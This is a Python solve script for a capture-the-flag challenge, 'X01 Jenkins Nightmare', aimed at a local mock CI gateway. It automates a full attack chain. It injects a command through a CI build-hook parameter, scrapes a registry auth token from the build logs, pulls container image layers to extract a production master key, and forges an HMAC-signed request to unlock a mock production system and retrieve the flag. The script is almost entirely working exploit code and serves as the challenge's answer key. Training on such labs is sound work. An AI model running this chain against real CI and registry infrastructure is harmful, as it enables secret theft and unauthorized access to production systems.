#!/usr/bin/env python3
"""
X01 — Jenkins Nightmare: Clean-Room Automated Solve Script
Executes full exploit progression:
Git -> CI -> Isolated Build Runtime -> OCI Registry -> Production Mock -> Flag
"""

import argparse
import configparser
import hashlib
import hmac
import io
import json
import re
import sys
import tarfile
import time
import urllib.request
import urllib.error

def http_get(url, headers=None):
    req = urllib.request.Request(url, headers=headers or {})
    try:
        with urllib.request.urlopen(req) as resp:
            return resp.status, resp.read(), dict(resp.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read(), dict(e.headers)

def http_post(url, data_dict=None, raw_data=None, headers=None):
    h = headers.copy() if headers else {}
    if data_dict is not None:
        body = json.dumps(data_dict).encode("utf-8")
        if "Content-Type" not in h:
            h["Content-Type"] = "application/json"
    elif raw_data is not None:
        body = raw_data
    else:
        body = b""
    
    req = urllib.request.Request(url, data=body, headers=h, method="POST")
    try:
        with urllib.request.urlopen(req) as resp:
            return resp.status, resp.read(), dict(resp.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read(), dict(e.headers)

def solve(host="127.0.0.1", port=8080):
    base_url = f"http://{host}:{port}"
    print(f"[*] Connecting to CI Gateway: {base_url}")

    # Step 1: Enumerate CI & Git Repositories
    print("[+] Step 1: Enumerating repositories and pipeline specifications...")
    code, body, _ = http_get(f"{base_url}/api/repos")
    assert code == 200, f"Failed to list repos: {code}"
    repos = json.loads(body.decode())["repositories"]
    print(f"    Found {len(repos)} repositories: {[r['name'] for r in repos]}")

    code, body, _ = http_get(f"{base_url}/api/repos/latveria/defense-core/blob?path=pipeline.yaml")
    assert code == 200, "Failed to read pipeline.yaml"
    pipeline_spec = json.loads(body.decode())["content"]
    assert "CUSTOM_TEST_HOOK" in pipeline_spec, "Expected CUSTOM_TEST_HOOK in pipeline specification"
    print("    [OK] Discovered CUSTOM_TEST_HOOK parameter injection in pipeline spec.")

    # Step 2: Trigger build with diagnostic hook
    print("[+] Step 2: Triggering build with diagnostic test hook (env)...")
    trigger_payload = {
        "repo": "latveria/defense-core",
        "branch": "main",
        "build_hook": "env"
    }
    code, body, _ = http_post(f"{base_url}/api/builds/trigger", data_dict=trigger_payload)
    assert code in (200, 202), f"Failed to trigger build: {code} {body}"
    build_id = json.loads(body.decode())["build_id"]
    print(f"    Dispatched Build #{build_id}. Polling for completion...")

    # Step 3: Poll build console and extract REGISTRY_AUTH_TOKEN
    registry_token = None
    for _ in range(15):
        time.sleep(1)
        code, body, _ = http_get(f"{base_url}/api/builds/{build_id}")
        if code == 200:
            bdata = json.loads(body.decode())
            logs = "\n".join(bdata.get("logs", []))
            if "REGISTRY_AUTH_TOKEN=" in logs:
                m = re.search(r"REGISTRY_AUTH_TOKEN=([a-zA-Z0-9_\-]+)", logs)
                if m:
                    registry_token = m.group(1)
                    break
            if bdata.get("status") in ("SUCCESS", "FAILED"):
                break

    assert registry_token, "Failed to extract REGISTRY_AUTH_TOKEN from runner console log"
    print(f"    [OK] Recovered Registry Bearer Token: {registry_token}")

    # Step 4: Access Local OCI Container Registry
    print("[+] Step 4: Querying Local OCI Container Registry via gateway proxy...")
    auth_headers = {"Authorization": f"Bearer {registry_token}"}
    code, body, _ = http_get(f"{base_url}/registry/v2/_catalog", headers=auth_headers)
    assert code == 200, f"Failed to access registry catalog: {code} {body}"
    catalog = json.loads(body.decode())["repositories"]
    print(f"    Registry Repositories: {catalog}")
    assert "latveria/production-core" in catalog, "Expected latveria/production-core in registry"

    # Step 5: Inspect Manifest & Extract Production Layer
    print("[+] Step 5: Fetching manifest and layer blobs for latveria/production-core:v1.0.0-release...")
    code, body, _ = http_get(f"{base_url}/registry/v2/latveria/production-core/manifests/v1.0.0-release", headers=auth_headers)
    assert code == 200, f"Failed to fetch manifest: {code}"
    manifest = json.loads(body.decode())
    layers = manifest.get("layers", [])
    print(f"    Discovered {len(layers)} image layers.")

    prod_conf_content = None
    for idx, layer in enumerate(layers):
        digest = layer["digest"]
        code, blob_bytes, _ = http_get(f"{base_url}/registry/v2/latveria/production-core/blobs/{digest}", headers=auth_headers)
        if code == 200:
            try:
                with tarfile.open(fileobj=io.BytesIO(blob_bytes), mode="r:gz") as tar:
                    for member in tar.getmembers():
                        if "production.conf" in member.name:
                            f = tar.extractfile(member)
                            prod_conf_content = f.read().decode("utf-8")
                            print(f"    [OK] Extracted production config from layer {digest[:18]}...")
                            break
            except Exception:
                pass
        if prod_conf_content:
            break

    assert prod_conf_content, "Failed to locate production.conf in image layer blobs"

    # Parse production configuration
    cfg = configparser.ConfigParser()
    cfg.read_string(prod_conf_content)
    prod_master_key = cfg.get("PRODUCTION_AUTH", "PROD_MASTER_KEY")
    deploy_agent_id = cfg.get("PRODUCTION_AUTH", "DEPLOY_AGENT_ID")
    authorized_action = cfg.get("PRODUCTION_AUTH", "AUTHORIZED_ACTION", fallback="OVERRIDE_PRODUCTION_MAINFRAME")
    target_core = cfg.get("PRODUCTION_AUTH", "TARGET_CORE", fallback="SOVEREIGN_CORE")
    print(f"    Discovered PROD_MASTER_KEY: {prod_master_key}")
    print(f"    Discovered DEPLOY_AGENT_ID: {deploy_agent_id}")

    # Step 6: Pivot to Production Mock Mainframe
    print("[+] Step 6: Computing HMAC-SHA256 signature and unlocking production mainframe...")
    override_body = json.dumps({
        "action": authorized_action,
        "target": target_core
    }).encode("utf-8")

    sig = hmac.new(prod_master_key.encode("utf-8"), override_body, hashlib.sha256).hexdigest()

    prod_headers = {
        "Content-Type": "application/json",
        "X-Latveria-Deploy-Agent": deploy_agent_id,
        "X-Latveria-Signature": sig
    }

    code, body, _ = http_post(f"{base_url}/api/v1/production/unlock", raw_data=override_body, headers=prod_headers)
    assert code == 200, f"Production unlock failed: {code} {body}"
    resp_data = json.loads(body.decode())
    flag = resp_data.get("flag")
    assert flag and flag.startswith("YUVA{"), f"Invalid flag received: {resp_data}"

    print(f"\n=======================================================")
    print(f"[SUCCESS] Flag captured: {flag}")
    print(f"=======================================================\n")
    return flag

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Solve X01 Jenkins Nightmare challenge")
    parser.add_argument("--host", default="127.0.0.1", help="Target host")
    parser.add_argument("--port", type=int, default=8080, help="Target port")
    args = parser.parse_args()

    try:
        solve(host=args.host, port=args.port)
    except Exception as e:
        print(f"[-] Solve failed: {e}")
        sys.exit(1)
